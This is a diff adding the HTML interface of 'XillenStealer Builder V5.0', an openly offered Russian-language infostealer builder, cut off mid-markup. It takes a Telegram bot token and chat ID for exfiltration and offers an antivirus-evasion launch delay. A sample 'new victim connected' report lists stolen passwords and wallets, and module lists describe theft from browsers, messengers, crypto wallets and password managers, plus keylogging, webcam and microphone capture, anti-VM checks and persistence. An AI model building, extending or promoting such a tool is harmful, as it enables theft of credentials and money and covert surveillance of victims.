@@ -1,0 +1,791 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: file:;" />
+    <title>XillenStealer Builder V5.0</title>
+    <link rel="stylesheet" href="style.css" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  </head>
+  <body>
+    <div class="rain-container" id="rainContainer"></div>
+    <div class="notification-container" id="notificationContainer"></div>
+    
+    <!-- Auth Screen -->
+    <div class="auth-screen" id="authScreen">
+      <div class="auth-container">
+        <div class="auth-header">
+          <img src="assets/logo.png" alt="XillenStealer" class="auth-logo" />
+          <h1 data-translate="auth.title">XillenStealer Builder</h1>
+                          <p data-translate="auth.version">v5.0</p>
+        </div>
+        <div class="auth-form">
+          <h2 data-translate="auth.login">Аутентификация</h2>
+          <p data-translate="auth.password">Введите пароль для доступа</p>
+            <div class="input-group">
+              <input type="password" id="passwordInput" placeholder="Пароль" data-translate-placeholder="auth.password.placeholder" />
+              <button id="loginBtn" class="btn primary" data-translate="auth.login.btn">Войти</button>
+            </div>
+            <div class="password-info">
+              <p data-translate="auth.password.info">Пароль указан в репозитории GitHub</p>
+            </div>
+          <div class="auth-links">
+            <a href="https://github.com/BengaminButton/XillenStealer" target="_blank" class="github-link">
+              <svg viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
+              GitHub Repository
+            </a>
+          </div>
+          <div class="auth-language">
+            <label for="authLanguageSelect" data-translate="auth.language">Язык:</label>
+            <select id="authLanguageSelect">
+              <option value="ru">Русский</option>
+              <option value="en">English</option>
+            </select>
+          </div>
+        </div>
+        <div class="auth-footer">
+          <p data-translate="auth.footer">Разработано командой XillenKillers | @XillenAdapter | @BengaminButton</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Main App -->
+    <div class="main-app" id="mainApp" style="display: none;">
+      <!-- Rain Effect Container -->
+      <div id="rainContainer" class="rain-container"></div>
+      
+      <div class="sidebar">
+        <div class="brand">
+          <img src="assets/logo.png" alt="Xillen" class="logo" />
+        </div>
+        <nav>
+          <button class="nav active" data-view="create">
+            <svg viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
+            <span data-translate="nav.create">Создать стиллер</span>
+          </button>
+          <button class="nav" data-view="builds">
+            <svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6z"/><polyline points="14,2 14,8 20,8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10,9 9,9 8,9"/></svg>
+            <span data-translate="nav.builds">Сборки</span>
+          </button>
+          <button class="nav" data-view="settings">
+            <svg viewBox="0 0 24 24"><path d="M19.14,12.94c0.04-0.3,0.06-0.61,0.06-0.94c0-0.32-0.02-0.64-0.07-0.94l2.03-1.58c0.18-0.14,0.23-0.41,0.12-0.61 l-1.92-3.32c-0.12-0.22-0.37-0.29-0.59-0.22l-2.39,0.96c-0.5-0.38-1.03-0.7-1.62-0.94L14.4,2.81c-0.04-0.24-0.24-0.41-0.48-0.41 h-3.84c-0.24,0-0.43,0.17-0.47,0.41L9.25,5.35C8.66,5.59,8.12,5.92,7.63,6.29L5.24,5.33c-0.22-0.08-0.47,0-0.59,0.22L2.74,8.87 C2.62,9.08,2.66,9.34,2.86,9.48l2.03,1.58C4.84,11.36,4.82,11.69,4.82,12s0.02,0.64,0.07,0.94l-2.03,1.58 c-0.18,0.14-0.23,0.41-0.12,0.61l1.92,3.32c0.12,0.22,0.37,0.29,0.59,0.22l2.39-0.96c0.5,0.38,1.03,0.7,1.62,0.94l0.36,2.54 c0.05,0.24,0.24,0.41,0.48,0.41h3.84c0.24,0,0.44-0.17,0.47-0.41l0.36-2.54c0.59-0.24,1.13-0.56,1.62-0.94l2.39,0.96 c0.22,0.08,0.47,0,0.59-0.22l1.92-3.32c0.12-0.22,0.07-0.47-0.12-0.61L19.14,12.94z M12,15.6c-1.98,0-3.6-1.62-3.6-3.6 s1.62-3.6,3.6-3.6s3.6,1.62,3.6,3.6S13.98,15.6,12,15.6z"/></svg>
+            <span data-translate="nav.settings">Настройки</span>
+          </button>
+          <button class="nav" data-view="about">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+            <span data-translate="nav.about">О программе</span>
+          </button>
+          <button class="nav" data-view="guide">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+            <span data-translate="nav.guide">Руководство</span>
+          </button>
+          <button class="nav" data-view="modules-faq">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/></svg>
+            <span data-translate="nav.faq">FAQ модулей</span>
+          </button>
+        </nav>
+        <div class="authors">
+          <span data-translate="about.developer">Главный разработчик:</span>
+          <a href="https://github.com/BengaminButton" target="_blank">github.com/BengaminButton</a>
+          <a href="https://t.me/Bengamin_Button" target="_blank">t.me/Bengamin_Button</a>
+          <span data-translate="about.team">Команда:</span>
+          <a href="https://t.me/XillenKillers" target="_blank">t.me/XillenKillers</a>
+        </div>
+      </div>
+
+      <div class="content">
+        <header class="topbar">
+          <div class="title" data-translate="app.title">XillenStealer Builder V5.0</div>
+          <div class="topbar-actions">
+            <button id="refreshBtn" class="btn" data-translate="topbar.refresh">Обновить</button>
+            <button id="settingsBtn" class="btn" data-translate="topbar.settings">Настройки</button>
+            <button id="exitBtn" class="btn" data-translate="topbar.exit">Выход</button>
+          </div>
+        </header>
+
+        <!-- Create Stealer Screen -->
+        <section class="card active" data-view="create">
+          <div class="create-header">
+            <h2 data-translate="create.title">Создание стиллера</h2>
+            <div class="status-bar">
+              <span data-translate="create.status">Статус:</span>
+              <span id="statusText" data-translate="create.status.ready">Готов к работе</span>
+            </div>
+          </div>
+
+          <!-- Progress Bar -->
+          <div class="progress-container" id="progressContainer" style="display: none;">
+            <div class="progress-header">
+              <div class="progress-title">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                  <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/>
+                </svg>
+                <h3 data-translate="create.compile">Компиляция в EXE</h3>
+              </div>
+              <div class="progress-percentage">
+                <span id="progressPercent">0%</span>
+              </div>
+            </div>
+            <div class="progress-info">
+              <span id="progressText" data-translate="create.progress.preparing">Подготовка...</span>
+              <div class="progress-steps">
+                <div class="step active" id="step1">
+                  <span data-translate="progress.analysis">Анализ</span>
+                </div>
+                <div class="step" id="step2">
+                  <span data-translate="progress.build">Сборка</span>
+                </div>
+                <div class="step" id="step3">
+                  <span data-translate="progress.optimize">Оптимизация</span>
+                </div>
+                <div class="step" id="step4">
+                  <span data-translate="progress.complete">Завершение</span>
+                </div>
+              </div>
+            </div>
+            <div class="progress-bar">
+              <div class="progress-fill" id="progressFill">
+                <div class="progress-shine"></div>
+              </div>
+            </div>
+            <div class="progress-actions">
+              <button id="cancelCompile" class="btn btn-cancel">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                  <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/>
+                </svg>
+                <span data-translate="create.cancel">Отменить</span>
+              </button>
+            </div>
+          </div>
+
+          <div class="create-content">
+            <div class="config-section">
+              <h3 data-translate="create.basic">Основные настройки</h3>
+              <div class="form-grid">
+                <div class="form-group">
+                  <label data-translate="create.name">Имя стиллера:</label>
+                  <input id="stealerName" type="text" value="XillenStealer" />
+                </div>
+                <div class="form-group">
+                  <label data-translate="create.icon">Иконка EXE:</label>
+                  <div class="file-input-wrapper">
+                    <input id="exeIcon" type="file" accept=".ico,.png,.jpg,.jpeg" style="display: none;" />
+                    <button type="button" class="file-select-btn" onclick="document.getElementById('exeIcon').click()">
+                      <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M14,2H6A2,2 0 0,0 4,4V20A2,2 0 0,0 6,22H18A2,2 0 0,0 20,20V8L14,2M18,20H6V4H13V9H18V20Z"/>
+                      </svg>
+                      <span data-translate="create.selectIcon">Выбрать иконку</span>
+                    </button>
+                    <span id="iconFileName" class="file-name" data-translate="create.noFile">Нет файла</span>
+                  </div>
+                </div>
+                <div class="form-group">
+                  <label data-translate="create.token">Токен бота:</label>
+                  <input id="botToken" type="text" placeholder="YOUR_BOT_TOKEN" />
+                </div>
+                <div class="form-group">
+                  <label data-translate="create.chat">ID чата:</label>
+                  <input id="chatId" type="text" placeholder="YOUR_CHAT_ID" />
+                </div>
+                <div class="form-group">
+                  <label data-translate="create.sleep">Задержка перед запуском (сек):</label>
+                  <div class="input-with-info">
+                    <input id="sleepTime" type="number" value="5" />
+                    <button class="info-btn" title="Информация о задержке">
+                      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+                    </button>
+                    <div class="info-tooltip">
+                      <h4 data-translate="info.sleep.title">Задержка запуска</h4>
+                      <p data-translate="info.sleep.desc">Время ожидания перед началом работы стиллера. Помогает избежать обнаружения антивирусом при запуске.</p>
+                    </div>
+                  </div>
+                </div>
+                <div class="form-group">
+                  <label data-translate="create.chunk">Размер чанка (байт):</label>
+                  <div class="input-with-info">
+                    <input id="chunkSize" type="number" value="1048576" />
+                    <button class="info-btn" title="Информация о размере чанка">
+                      <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+                    </button>
+                    <div class="info-tooltip">
+                      <h4 data-translate="info.chunk.title">Размер чанка</h4>
+                      <p data-translate="info.chunk.desc">Размер блока данных для отправки в Telegram. Больший размер = быстрее передача, но больше нагрузка на сеть.</p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="modules-section">
+              <h3 data-translate="create.modules">Модули стиллера V5.0</h3>
+              <div class="modules-grid" id="modulesGrid">
+                <!-- Modules will be populated by JS -->
+              </div>
+            </div>
+          </div>
+
+          <div class="actions">
+            <button id="buildV5Btn" class="btn primary" style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); font-size: 18px; padding: 15px 40px;">Создать V5</button>
+            <button id="resetBtn" class="btn" data-translate="create.reset">Сброс</button>
+            <button id="cancelBtn" class="btn" data-translate="create.cancel">Отмена</button>
+          </div>
+
+          <div class="log-section">
+            <h3 data-translate="create.log">Журнал сборки:</h3>
+            <textarea id="buildLog" readonly></textarea>
+          </div>
+        </section>
+
+        <!-- Builds Screen -->
+        <section class="card" data-view="builds">
+          <h2 data-translate="builds.title">Мои сборки</h2>
+          <div class="builds-stats" id="buildsStats">
+            <!-- Stats will be populated by JS -->
+          </div>
+          <div class="builds-list" id="buildsList">
+            <!-- Builds will be populated by JS -->
+          </div>
+          <div class="actions">
+            <button id="openBuildsFolder" class="btn primary" data-translate="builds.open">Открыть папку builds</button>
+            <button id="refreshBuilds" class="btn" data-translate="builds.refresh">Обновить</button>
+          </div>
+        </section>
+
+        <!-- Settings Screen -->
+        <section class="card" data-view="settings">
+          <h2 data-translate="settings.title">Настройки</h2>
+          <div class="settings-grid">
+            <div class="settings-section">
+              <h3 data-translate="settings.theme">Тема интерфейса</h3>
+              <div class="theme-buttons">
+                <button id="themeDeepDark" class="btn theme-btn active" data-translate="settings.theme.deep">Глубокий тёмный</button>
+                <button id="themeScarlet" class="btn theme-btn" data-translate="settings.theme.scarlet">Алый</button>
+                <button id="themeLight" class="btn theme-btn" data-translate="settings.theme.light">Светлая</button>
+              </div>
+            </div>
+            <div class="settings-section">
+              <h3 data-translate="settings.other">Другие настройки</h3>
+              <div class="setting-item">
+                <label data-translate="settings.opacity">Прозрачность окна:</label>
+                <input id="transparencySlider" type="range" min="0.5" max="1" step="0.05" value="1" />
+                <span id="transparencyValue">100%</span>
+              </div>
+              <div class="setting-item">
+                <label data-translate="settings.rain">Эффект дождя:</label>
+                <button id="rainToggle" class="btn toggle off" data-translate="settings.rain.off">Выкл</button>
+              </div>
+              <div class="setting-item">
+                <label data-translate="settings.language">Язык:</label>
+                <select id="languageSelect">
+                  <option value="ru">Русский</option>
+                  <option value="en">English</option>
+                </select>
+              </div>
+              <div class="setting-item">
+                <label data-translate="settings.telegram.lang">Язык отчета в Telegram:</label>
+                <select id="telegramLanguageSelect">
+                  <option value="ru">Русский</option>
+                  <option value="en">English</option>
+                </select>
+              </div>
+              <div class="setting-item">
+                <label data-translate="settings.telegram.preview">Предпросмотр отчета:</label>
+                <div class="telegram-preview" id="telegramPreview">
+                  <div class="telegram-message">
+                    <div class="telegram-header">
+                      <div class="telegram-avatar">🤖</div>
+                      <div class="telegram-info">
+                        <div class="telegram-name">XillenStealer Bot</div>
+                        <div class="telegram-time">сейчас</div>
+                      </div>
+                    </div>
+                    <div class="telegram-content" id="telegramContent">
+                      🎯 <strong>Новая жертва подключена!</strong><br>
+                      📍 <strong>IP:</strong> 192.168.1.100<br>
+                      🌍 <strong>Страна:</strong> Россия<br>
+                      💻 <strong>ОС:</strong> Windows 11<br>
+                      🕐 <strong>Время:</strong> 25.10.2025 12:34:56<br><br>
+                      📊 <strong>Собранные данные:</strong><br>
+                      • Браузеры: Chrome, Firefox<br>
+                      • Пароли: 15 сохраненных<br>
+                      • Крипто-кошельки: MetaMask<br>
+                      • Скриншот: ✅<br>
+                      • Системная информация: ✅
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <!-- About Screen -->
+        <section class="card" data-view="about">
+          <h2 data-translate="about.title">О программе</h2>
+          <div class="about-content">
+            <div class="info-card">
+              <h3 data-translate="about.info">Информация о программе</h3>
+              <div class="info-grid">
+                <div class="info-item">
+                  <span data-translate="about.author">Главный разработчик:</span>
+                  <span>BengaminButton</span>
+                </div>
+                <div class="info-item">
+                  <span data-translate="about.github">GitHub:</span>
+                  <span>github.com/BengaminButton</span>
+                </div>
+                <div class="info-item">
+                  <span data-translate="about.telegram">Telegram:</span>
+                  <span>@Bengamin_Button</span>
+                </div>
+                <div class="info-item">
+                  <span data-translate="about.team">Команда:</span>
+                  <span>XillenKillers</span>
+                </div>
+                <div class="info-item">
+                  <span data-translate="about.version">Версия:</span>
+                  <span>4.0</span>
+                </div>
+                <div class="info-item">
+                  <span data-translate="about.year">Год:</span>
+                  <span>2025</span>
+                </div>
+              </div>
+            </div>
+            <div class="features-card">
+                              <h3 data-translate="about.features">Возможности XillenStealer V5.0</h3>
+              <div class="features-list">
+                <div class="feature-item">✓ <span data-translate="about.feature.cross">Кросс-платформенная поддержка</span></div>
+                <div class="feature-item">✓ <span data-translate="about.feature.data">Расширенный сбор данных</span></div>
+                <div class="feature-item">✓ <span data-translate="about.feature.stealth">Стелс-технологии</span></div>
+                <div class="feature-item">✓ <span data-translate="about.feature.persist">Персистентность</span></div>
+                <div class="feature-item">✓ <span data-translate="about.feature.anti">Анти-отладка и анти-VM</span></div>
+                <div class="feature-item">✓ <span data-translate="about.feature.gpu">GPU память и eBPF хуки</span></div>
+                <div class="feature-item">✓ <span data-translate="about.feature.tpm">TPM модуль и UEFI руткит</span></div>
+                <div class="feature-item">✓ <span data-translate="about.feature.docker">Docker и Kubernetes</span></div>
+                <div class="feature-item">✓ <span data-translate="about.feature.iot">IoT сканирование</span></div>
+                <div class="feature-item">✓ <span data-translate="about.feature.webrtc">WebRTC сбор данных</span></div>
+              </div>
+              
+              <h3 data-translate="about.modules.title">Подробное описание модулей</h3>
+              <div class="modules-description">
+                <div class="module-category">
+                  <h4 data-translate="about.modules.browsers.title">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" style="display: inline-block; margin-right: 8px; vertical-align: middle;">
+                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                    </svg>
+                    <span data-translate="about.modules.browsers.title">Браузеры и пароли (100+ браузеров)</span>
+                  </h4>
+                  <div class="module-list">
+                    <div class="module-item"><strong data-translate="about.modules.browsers.chromium">Chromium-браузеры:</strong> Chrome, Chromium, Edge, Brave, Vivaldi, Opera, Yandex, Slimjet, Comodo, SRWare, Torch, Blisk, Epic, Uran, Centaury, Falkon, Superbird, CocCoc, QQBrowser, 360Chrome, Sogou, Liebao, Qihu, Maxthon, SalamWeb, Arc, Sidekick, SigmaOS, Floorp, LibreWolf, Ghost Browser, Konqueror, Midori, Otter, Pale Moon, Basilisk, Waterfox, IceWeasel, IceCat, <strong>Tor Browser</strong>, Iridium, Ungoogled Chromium, Iron, Comodo Dragon, CoolNovo, SlimBrowser, Avant, Lunascape, GreenBrowser, TheWorld, Tango, RockMelt, Flock, Wyzo, Swiftfox, Swiftweasel, K-Meleon, Camino, Galeon</div>
+                    <div class="module-item"><strong data-translate="about.modules.browsers.firefox">Firefox-браузеры:</strong> Firefox, Waterfox, PaleMoon, SeaMonkey, IceCat, Cyberfox, <strong>TorBrowser</strong>, LibreWolf, Floorp, Basilisk, IceWeasel, <strong>Tor Browser</strong>, Pale Moon, K-Meleon, Camino, Galeon, Konqueror, Midori, Falkon, Otter, Swiftfox, Swiftweasel, Wyzo, Flock, RockMelt, Tango, TheWorld, GreenBrowser, Lunascape, Avant, SlimBrowser, CoolNovo, Comodo Dragon, Iron, Ungoogled Chromium, Iridium</div>
+                    <div class="module-item"><strong data-translate="about.modules.browsers.specialized">Специализированные приложения:</strong> Discord, Steam, EpicGames, Telegram, Signal, Slack, Skype, WhatsApp, Element, Matrix, RocketChat, Mattermost, Teams, Zoom, Webex, Jitsi, Wire, Threema, Wickr, Session, Briar, RetroShare, Tox, Ricochet, ChatSecure, Conversations, Silence, Signal Desktop, Telegram Desktop</div>
+                  </div>
+                </div>
+                
+                <div class="module-category">
+                  <h4 data-translate="about.modules.wallets.title">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" style="display: inline-block; margin-right: 8px; vertical-align: middle;">
+                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/>
+                    </svg>
+                    <span data-translate="about.modules.wallets.title">Крипто-кошельки (50+ кошельков)</span>
+                  </h4>
+                  <div class="module-list">
+                    <div class="module-item"><strong data-translate="about.modules.wallets.main">Основные кошельки:</strong> Exodus, Electrum, Atomic Wallet, Coinbase, MetaMask, Trust Wallet, Phantom, Solflare, Backpack, Glow, Rabby, Rainbow, Argent, Gnosis Safe, Frame, Brave Wallet</div>
+                    <div class="module-item"><strong data-translate="about.modules.wallets.exchanges">Биржи:</strong> Binance, Huobi, OKEx, KuCoin, Kraken, Gemini, Coinbase Pro, Bitfinex, Bittrex, Poloniex, Gate.io, Bybit, FTX, Crypto.com</div>
+                    <div class="module-item"><strong data-translate="about.modules.wallets.payments">Платежные системы:</strong> Robinhood, Webull, SoFi, Cash App, PayPal, Venmo, Zelle, Apple Pay, Google Pay, Samsung Pay</div>
+                  </div>
+                </div>
+                
+                <div class="module-category">
+                  <h4 data-translate="about.modules.security.title">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" style="display: inline-block; margin-right: 8px; vertical-align: middle;">
+                      <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M12,7C13.4,7 14.8,8.6 14.8,10V11H16V16H8V11H9.2V10C9.2,8.6 10.6,7 12,7M12,8.2C11.2,8.2 10.4,8.7 10.4,10V11H13.6V10C13.6,8.7 12.8,8.2 12,8.2Z"/>
+                    </svg>
+                    <span data-translate="about.modules.security.title">Система и безопасность</span>
+                  </h4>
+                  <div class="module-list">
+                    <div class="module-item"><strong data-translate="about.modules.security.antidebug">Анти-отладка:</strong> <span data-translate="about.modules.security.antidebug.desc">Защищает от отладчиков и анализа в песочнице, детектирует OllyDbg, x64dbg, IDA Pro, Ghidra, WinDbg, Process Hacker, Process Monitor, Wireshark, Fiddler, Burp Suite</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.security.antivm">Анти-VM:</strong> <span data-translate="about.modules.security.antivm.desc">Обнаруживает виртуальные машины (VMware, VirtualBox, Hyper-V, QEMU, Parallels, Xen, KVM) и завершает работу</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.security.screenshot">Скриншот экрана:</strong> <span data-translate="about.modules.security.screenshot.desc">Делает скриншот экрана жертвы в высоком качестве</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.security.keylogger">Клавиатурный шпион:</strong> <span data-translate="about.modules.security.keylogger.desc">Записывает нажатия клавиш в реальном времени</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.security.audio">Запись звука:</strong> <span data-translate="about.modules.security.audio.desc">Записывает звук с микрофона жертвы</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.security.webcam">Веб-камера:</strong> <span data-translate="about.modules.security.webcam.desc">Делает фото с веб-камеры жертвы</span></div>
+                  </div>
+                </div>
+                
+                <div class="module-category">
+                  <h4 data-translate="about.modules.files.title">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" style="display: inline-block; margin-right: 8px; vertical-align: middle;">
+                      <path d="M14,2H6A2,2 0 0,0 4,4V20A2,2 0 0,0 6,22H18A2,2 0 0,0 20,20V8L14,2M18,20H6V4H13V9H18V20Z"/>
+                    </svg>
+                    <span data-translate="about.modules.files.title">Файлы и данные</span>
+                  </h4>
+                  <div class="module-list">
+                    <div class="module-item"><strong data-translate="about.modules.files.documents">Документы:</strong> <span data-translate="about.modules.files.documents.desc">Крадет файлы из папки Документы (PDF, DOC, DOCX, XLS, XLSX, PPT, PPTX, TXT, RTF)</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.files.desktop">Рабочий стол:</strong> <span data-translate="about.modules.files.desktop.desc">Извлекает файлы с рабочего стола</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.files.downloads">Загрузки:</strong> <span data-translate="about.modules.files.downloads.desc">Крадет файлы из папки Загрузки</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.files.system">Системная информация:</strong> <span data-translate="about.modules.files.system.desc">Собирает данные о системе, процессоре, памяти, видеокарте, сетевых адаптерах, установленных программах</span></div>
+                  </div>
+                </div>
+                
+                <div class="module-category">
+                  <h4 data-translate="about.modules.additional.title">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" style="display: inline-block; margin-right: 8px; vertical-align: middle;">
+                      <path d="M12,2A10,10 0 0,0 2,12A10,10 0 0,0 12,22A10,10 0 0,0 22,12A10,10 0 0,0 12,2M12,4A8,8 0 0,1 20,12A8,8 0 0,1 12,20A8,8 0 0,1 4,12A8,8 0 0,1 12,4M12,6A6,6 0 0,0 6,12A6,6 0 0,0 12,18A6,6 0 0,0 18,12A6,6 0 0,0 12,6M12,8A4,4 0 0,1 16,12A4,4 0 0,1 12,16A4,4 0 0,1 8,12A4,4 0 0,1 12,8Z"/>
+                    </svg>
+                    <span data-translate="about.modules.additional.title">Дополнительные модули</span>
+                  </h4>
+                  <div class="module-list">
+                    <div class="module-item"><strong data-translate="about.modules.additional.fingerprint">Детект браузерных отпечатков:</strong> <span data-translate="about.modules.additional.fingerprint.desc">Детект браузерных отпечатков, сбор информации о браузере, плагинах, расширениях</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.additional.clipboard">Мониторинг буфера обмена:</strong> <span data-translate="about.modules.additional.clipboard.desc">Перехват буфера обмена, мониторинг скопированного текста</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.additional.filesystem">Мониторинг файловой системы:</strong> <span data-translate="about.modules.additional.filesystem.desc">Мониторинг изменений файлов в реальном времени</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.additional.network">Анализ сетевого трафика:</strong> <span data-translate="about.modules.additional.network.desc">Анализ сетевого трафика, перехват пакетов</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.additional.password">Интеграция с менеджерами паролей:</strong> <span data-translate="about.modules.additional.password.desc">Интеграция с менеджерами паролей (1Password, LastPass, Bitwarden, Dashlane, Keeper)</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.additional.social">Токены социальных сетей:</strong> <span data-translate="about.modules.additional.social.desc">Токены соцсетей (Instagram, TikTok, Facebook, Twitter, LinkedIn, Snapchat)</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.additional.iot">IoT сканер:</strong> <span data-translate="about.modules.additional.iot.desc">Сканирование IoT устройств в сети</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.additional.webrtc">WebRTC данные:</strong> <span data-translate="about.modules.additional.webrtc.desc">Сбор WebRTC данных для определения реального IP</span></div>
+                  </div>
+                </div>
+                
+                <div class="module-category">
+                  <h4 data-translate="about.modules.games.title">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" style="display: inline-block; margin-right: 8px; vertical-align: middle;">
+                      <path d="M21,6H3A2,2 0 0,0 1,8V16A2,2 0 0,0 3,18H21A2,2 0 0,0 23,16V8A2,2 0 0,0 21,6M21,16H3V8H21V16M6,15H8V13H10V11H8V9H6V11H4V13H6V15M18.5,12A1.5,1.5 0 0,1 17,10.5A1.5,1.5 0 0,1 18.5,9A1.5,1.5 0 0,1 20,10.5A1.5,1.5 0 0,1 18.5,12M18.5,7A3.5,3.5 0 0,0 15,10.5A3.5,3.5 0 0,0 18.5,14A3.5,3.5 0 0,0 22,10.5A3.5,3.5 0 0,0 18.5,7Z"/>
+                    </svg>
+                    <span data-translate="about.modules.games.title">Игровые лаунчеры</span>
+                  </h4>
+                  <div class="module-list">
+                    <div class="module-item"><strong data-translate="about.modules.games.steam">Steam:</strong> <span data-translate="about.modules.games.steam.desc">Извлечение данных Steam аккаунта, игр, друзей</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.games.epic">Epic Games:</strong> <span data-translate="about.modules.games.epic.desc">Данные Epic Games Launcher</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.games.minecraft">Minecraft:</strong> <span data-translate="about.modules.games.minecraft.desc">Данные Minecraft аккаунта</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.games.origin">Origin:</strong> <span data-translate="about.modules.games.origin.desc">Данные Origin (EA Games)</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.games.uplay">Uplay:</strong> <span data-translate="about.modules.games.uplay.desc">Данные Uplay (Ubisoft)</span></div>
+                    <div class="module-item"><strong data-translate="about.modules.games.battlenet">Battle.net:</strong> <span data-translate="about.modules.games.battlenet.desc">Данные Battle.net (Blizzard)</span></div>
+                  </div>
+                </div>
+                
+                <div class="module-category">
+                  <h4 data-translate="about.modules.technical.title">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor" style="display: inline-block; margin-right: 8px; vertical-align: middle;">
